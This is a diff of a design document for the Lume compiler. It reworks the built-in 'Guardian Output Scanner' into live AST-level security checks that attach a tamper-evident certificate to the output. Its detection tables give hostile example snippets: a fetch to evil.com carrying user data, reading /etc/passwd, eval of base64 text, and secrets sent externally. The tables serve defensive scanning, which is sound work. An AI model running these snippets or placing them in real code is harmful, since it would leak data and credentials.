@@ -433,11 +433,15 @@ lume run app.lume                    # Auto-detects mode from file header
 - [ ] **Safety:** `.lume/security-config.json` project-level config for all security settings, committable to version control
 - [ ] **Safety:** Compile lock file (`.lume/compile-lock.json`) prevents regressions when patterns/corrections evolve
 - [ ] **Guardian Output Scanner:** Built into the compiler — runs automatically on every compilation for every developer, not optional, not a separate product
-- [ ] **Guardian Output Scanner:** Compiled JavaScript scanned for malicious patterns AFTER transpilation, BEFORE writing to disk
-- [ ] **Guardian Output Scanner:** `raw:` block output scanned for eval(), obfuscated code, credential access, unauthorized network requests
+- [ ] **Guardian Output Scanner:** Live scanning — each AST node security-checked at creation time during Intent Resolution, not after compilation
+- [ ] **Guardian Output Scanner:** Dangerous instruction flagged immediately at the line it occurs, with interactive approve/skip/rephrase options
+- [ ] **Guardian Output Scanner:** `raw:` blocks get separate JavaScript-level scan (only part of pipeline scanned post-compilation, because raw blocks skip AST)
+- [ ] **Guardian Output Scanner:** Security certificate embedded in compiled JavaScript output — includes hash, scan level, timestamp, node count
+- [ ] **Guardian Output Scanner:** `lume verify --hash <hash>` validates certificate and confirms code passed security pipeline
+- [ ] **Guardian Output Scanner:** Certificate hash detects post-compilation tampering — modified JavaScript invalidates the certificate
 - [ ] **Guardian Output Scanner:** Community patterns from Collective Intelligence registry scanned at download time — flagged patterns quarantined
 - [ ] **Guardian Output Scanner:** Configurable scan levels in `.lume/security-config.json`: off, basic, standard (default), strict
-- [ ] **Guardian Output Scanner:** Blocked output shows detailed report: what was found, which line, risk level, how to resolve
+- [ ] **Guardian Output Scanner:** CI/CD integration — build pipelines can check for certificate header and reject uncertified JavaScript
 - [ ] **Determinism:** AI resolutions (Layer B) are cached and committed — same input always produces same output on recompile
 - [ ] **Performance:** AI calls are batched (multiple unresolved lines in one request) to minimize API calls and compile time
 - [ ] **Performance:** Cost transparency — compiler shows how many AI calls were made and estimated cost
@@ -1699,11 +1703,11 @@ This is critical. Lume must be known for security, not just convenience. The sec
 
 - **Layer 1: Input Security** — Before your code compiles, the Security Layer scans your instructions for dangerous operations. File destruction, credential exposure, privilege escalation, resource exhaustion — 11 threat categories are checked before a single line of JavaScript is generated.
 
-- **Layer 2: Output Security (Guardian Output Scanner)** — After your code compiles, the Guardian Output Scanner scans the generated JavaScript for malicious patterns. Obfuscated code, unauthorized network requests, eval() calls, credential access, crypto mining, dependency hijacking — 8 scan categories run on every compilation. If anything suspicious is found, the code is blocked and you see a detailed report explaining exactly what was flagged and why.
+- **Layer 2: Live Security (Guardian Output Scanner)** — Security doesn't wait until the end. As the compiler processes each instruction, the Guardian Output Scanner verifies it in real-time. Dangerous operations are caught the instant they're written — not after the whole program compiles. By the time your compiled code is produced, every single instruction has already been security-verified. The output carries a Security Certificate proving it passed all checks. If anyone tampers with the compiled code afterward, the certificate becomes invalid.
 
 - **Layer 3: Sandbox Mode** — The first time a program runs (or any time it changes significantly), it executes in a sandbox. You see a complete report of everything the program WOULD do — every database query, every file write, every network call — before it actually does anything. You approve, or it doesn't run.
 
-- "Three layers. Input, output, runtime. No other programming language in the world scans your code at every stage of the pipeline."
+- "Three layers. Before, during, and after compilation. Your code is certified clean at birth — not inspected after the fact. No other programming language in the world does this."
 
 - Visual diagram showing the pipeline with the three security checkpoints highlighted
 
@@ -1806,70 +1810,115 @@ The CNLD (Certified Lume Natural Language Developer) certification:
 - Webhook endpoint for Stripe events (subscription created, canceled, payment failed)
 - Grace period: if payment fails, Pro features remain active for 7 days before downgrading
 
-### 6. Guardian Output Scanner — Built-In Compiled Code Security
+### 6. Guardian Output Scanner — Built-In Live Security (Certified at Birth)
 
 **IMPORTANT: This is NOT the Guardian Scanner product from the DarkWave ecosystem (guardianscanner.tlid.io). This is a separate, built-in component of the Lume compiler itself.** It operates on the same philosophy — scan everything, flag suspicious patterns, give the user information to decide — but it is part of Lume, ships with Lume, and runs automatically for EVERY developer on EVERY compilation. It is not optional, not a subscription feature, not a separate download. When someone installs Lume and compiles a program, the Guardian Output Scanner runs. It is as fundamental to the compiler as the Auto-Correct Layer or the Tolerance Chain.
 
-The security layer (Section 3 in Critical Architectural Requirements) scans the INPUT — the English instructions. But once the code is compiled to JavaScript, a second security pass is needed on the OUTPUT. The Guardian Output Scanner scans the compiled code for malicious patterns, red flags, and suspicious behavior before it's written to disk.
+#### Architecture: Live Scanning, Not Post-Compilation
 
-**Why input scanning alone is not enough:**
+The Guardian Output Scanner does NOT wait until the end of compilation to check the output. It scans **live, in real-time, as each AST node is created** during the Intent Resolver phase. By the time the transpiler produces JavaScript, every instruction has already been security-verified. The compiled output is **certified clean at birth** — not inspected after the fact.
 
-1. **`raw:` escape hatch bypass:** Developers can inject arbitrary JavaScript via `raw:` blocks. The input security layer intentionally skips these because the developer took control. But that raw code could contain malicious JavaScript — backdoors, keyloggers, obfuscated exfiltration, crypto miners. The compiled output must be scanned regardless of how it got there.
+**The pipeline with live scanning:**
 
-2. **Pattern poisoning via Collective Intelligence:** If someone contributes a malicious pattern to the community registry (maps an innocent phrase to a dangerous AST node), the input scanner wouldn't flag it because the English looks normal. The compiled JavaScript output is where the malice appears.
+```
+English Input -> Auto-Correct -> Intent Resolver:
+  Line 1: resolve to AST node -> SECURITY CHECK -> passed
+  Line 2: resolve to AST node -> SECURITY CHECK -> passed
+  Line 3: resolve to AST node -> SECURITY CHECK -> FLAGGED (dangerous operation)
+  Line 4: resolve to AST node -> SECURITY CHECK -> passed
+  ...
+-> All AST nodes pre-certified -> Transpiler -> Certified JavaScript + Security Certificate
+```
 
-3. **Cross-module attacks:** A single module looks clean. But when combined with another module, the compiled output does something neither module does alone. Only scanning the final compiled JavaScript catches this.
+**Why live scanning is better than a post-compilation scan:**
 
-4. **AI-generated code review:** When Layer B (AI resolution) generates AST nodes, the AI could occasionally produce code with unintended side effects. Scanning the compiled output catches anything the AI got wrong.
+1. **Immediate feedback.** A dangerous instruction on line 3 is caught at line 3, not after the entire file compiles. The developer knows immediately which line has the issue.
+2. **No wasted work.** The compiler doesn't spend time compiling 500 lines only to reject the output at the end. Issues are caught as they happen.
+3. **AST-level detection is more accurate than JavaScript-level detection.** At the AST level, the scanner knows the developer's INTENT (what they asked for). At the JavaScript level, it can only see the generated code and guess. "Delete all user records" at the AST level is unambiguously a mass deletion. The same operation in JavaScript might look like `await db.query("DELETE FROM users")` — which could be legitimate in a cleanup script. The AST carries the context; the JavaScript doesn't.
+4. **`raw:` blocks get a separate pass.** Since raw blocks bypass the Intent Resolver (no AST is generated), they get their own dedicated scan at the JavaScript level. This is the ONLY part of the pipeline that gets a post-compilation scan, because it's the only part that skips the AST security check.
 
-**Compiled Output Scanner — what it checks:**
+**Live scan checks (at AST node creation time):**
+
+| Scan Category | What It Detects | When It Fires |
+|--------------|----------------|---------------|
+| Destructive operations | Delete, drop, truncate, wipe, clear targeting data or files | AST node type = deletion + target = data/files |
+| Network exfiltration | Sending data to external/undeclared domains | AST node type = network request + domain not in allowed list |
+| Credential access | Reading env vars, secrets, tokens and passing to output/network | AST references sensitive data + AST sends it externally |
+| Privilege escalation | Changing roles, granting admin, bypassing auth | AST node modifies permission/role/auth entities |
+| Mass operations | Unbounded loops with external side effects | AST loop node + no limit + side effect (email, API, write) |
+| Resource exhaustion | Requesting unreasonable resources | AST allocation exceeds configured limits |
+| Semantic camouflage | Combined intent of multiple AST nodes is dangerous even though individual nodes are safe | Cross-node analysis after each block resolves |
+| Infinite execution | Loops or recursion with no termination condition | AST loop/recursion with no exit condition |
+
+**`raw:` block scanning (JavaScript-level, post-compilation):**
+
+Since `raw:` blocks bypass the Intent Resolver entirely, the Guardian Output Scanner performs a separate JavaScript-level scan on raw block output only:
 
 | Scan Category | What It Detects | Example |
 |--------------|----------------|---------|
-| Network exfiltration | Outbound requests to unknown/suspicious domains | `fetch('https://evil.com/collect', { body: JSON.stringify(userData) })` |
-| File system access | Reads/writes outside the project directory | `fs.readFileSync('/etc/passwd')` |
-| Credential access | References to env vars, API keys, tokens | `process.env.DATABASE_URL` sent to external endpoint |
-| Obfuscated code | Base64-encoded strings, eval(), new Function(), heavily obfuscated variable names | `eval(atob('bWFsaWNpb3Vz'))` |
-| Crypto mining | CPU-intensive loops with no apparent purpose, WebSocket connections to mining pools | Infinite hash computation loops |
-| Data collection | Excessive data aggregation before a network call | Collecting user data from multiple sources into a single object, then POSTing it |
-| Dependency hijacking | Imports from unexpected or lookalike packages | `require('lod-ash')` instead of `require('lodash')` |
-| Infinite resource consumption | Unbounded recursion, memory allocation without limits | `while(true) { array.push(new ArrayBuffer(1e8)) }` |
+| Obfuscated code | Base64-encoded strings, eval(), new Function() | `eval(atob('bWFsaWNpb3Vz'))` |
+| Network requests to undeclared domains | fetch/XMLHttpRequest to external URLs | `fetch('https://evil.com/collect')` |
+| File system access outside project | Reads/writes to system paths | `fs.readFileSync('/etc/passwd')` |
+| Credential exposure | env vars passed to network/output | `process.env.SECRET` sent externally |
+| Crypto mining patterns | CPU-intensive loops, mining pool connections | Infinite hash computation |
+| Dependency hijacking | Imports from lookalike packages | `require('lod-ash')` instead of `require('lodash')` |
 
-**How it works in the pipeline:**
+#### Security Certificate
+
+When all checks pass, the compiled JavaScript output includes a security certificate comment at the top of the file:
+
+```javascript
+/**
+ * LUME SECURITY CERTIFIED
+ * Source: app.lume (mode: english, 47 lines)
+ * AST nodes scanned: 47/47 passed
+ * Raw blocks scanned: 2/2 passed
+ * Scan level: standard
+ * Compiled: 2026-09-15T14:30:00Z
+ * Certificate hash: a3f8b2c1e9d4...
+ * Verify: lume verify --hash a3f8b2c1e9d4...
+ */
+```
+
+**What the certificate enables:**
+- **Verification:** Anyone can run `lume verify --hash <hash>` or check `lume-lang.com/verify/<hash>` to confirm the code was compiled through Lume's security pipeline
+- **CI/CD integration:** Build pipelines can check for the certificate header and reject any JavaScript that wasn't compiled through Lume's security pipeline
+- **Chain of trust:** If a `.js` file has a Lume Security Certificate, you know every instruction in it was security-checked at the AST level. If it doesn't have the certificate, it wasn't compiled through Lume (or the security config was set to "off")
+- **Tamper detection:** The certificate hash is a hash of the compiled output. If anyone modifies the JavaScript after compilation, the hash won't match and the certificate is invalid
+
+**Developer experience when something is flagged:**
+
+Since scanning is live, the developer sees flags immediately during compilation:
 
 ```
-English Input -> Auto-Correct -> Intent Resolver -> Security Layer (INPUT scan)
--> Lume AST -> Transpiler -> JavaScript
--> Guardian Output Scanner (OUTPUT scan) -> If clean: write file + compile lock
-                                          -> If flagged: show report, block output
+Compiling app.lume...
+  Line 1: get all users from the database ............ OK
+  Line 2: filter the ones who are inactive ........... OK
+  Line 3: delete all their records ................... FLAGGED
+
+  [guardian] Line 3: Mass deletion detected
+    Operation: DELETE on "users" table (filtered set, ~unknown count)
+    Risk: Destructive — this permanently removes data
+    Action: Confirm this operation is intentional:
+      - Press 'y' to approve and continue compilation
+      - Press 'n' to skip this line and continue
+      - Press 'r' to rephrase this instruction
+
+  > y (approved by developer)
+
+  Line 4: show "Cleanup complete" .................... OK
+  Line 5: [raw block] ............................... SCANNING
+    Raw block: eval() detected ...................... BLOCKED
+
+  [guardian] Line 5 (raw block): eval() usage blocked
+    Code: eval(userInput)
+    Risk: HIGH — arbitrary code execution from user input
+    Action: BLOCKED. Remove eval() or use --accept-risk flag.
+
+Compilation stopped. 1 block, 1 approved warning.
 ```
 
-The Guardian Output Scanner runs AFTER the transpiler produces JavaScript, BEFORE the output is written to disk. If it flags anything, the developer sees a report:
-
-```
-[guardian] Compiled output scan for app.lume:
-
-  WARNING — Line 12 (from raw: block, line 8 in source):
-    Detected outbound network request to external domain: "api.unknown-service.com"
-    This was not declared in the project's allowed_domains list.
-    Risk: Potential data exfiltration
-    Action: Review this request. If intentional, add to allowed_domains in .lume/security-config.json
-
-  WARNING — Line 34 (compiled from "save the user preferences"):
-    Detected eval() usage in compiled output.
-    eval() executes arbitrary code and is a common attack vector.
-    Risk: Code injection
-    Action: Review the compiled JavaScript. If this is intentional, acknowledge with --accept-risk flag.
-
-  BLOCK — Line 47 (from raw: block, line 22 in source):
-    Detected obfuscated code: Base64-encoded string passed to eval()
-    This is a common pattern for hiding malicious payloads.
-    Risk: HIGH — hidden code execution
-    Action: BLOCKED. This code will not be written to output. Remove the obfuscated code or use plain JavaScript.
-
-Scan result: 2 warnings, 1 block
-Output NOT written. Resolve the blocked issue and re-compile.
-```
+This is live, interactive, and inline with the compilation process — not a separate report at the end.
 
 **Scan levels (configurable in `.lume/security-config.json`):**
 
@@ -1883,15 +1932,16 @@ Output NOT written. Resolve the blocked issue and re-compile.
     "allowed_domains": ["api.myapp.com", "localhost"],
     "scan_raw_blocks": true,
     "scan_ai_generated": true,
-    "scan_community_patterns": true
+    "scan_community_patterns": true,
+    "certificate": true
   }
 }
 ```
 
 Scan levels:
-- `"off"` — no output scanning (not recommended)
+- `"off"` — no scanning, no certificate (not recommended)
 - `"basic"` — only check for eval(), obfuscated code, and file system access outside project
-- `"standard"` — full scan (default) — all categories listed above
+- `"standard"` — full scan (default) — all categories listed above + security certificate
 - `"strict"` — everything in standard + flag any network request, any file system access, any dependency import for manual review. For high-security environments.
 
 **Community pattern validation:**
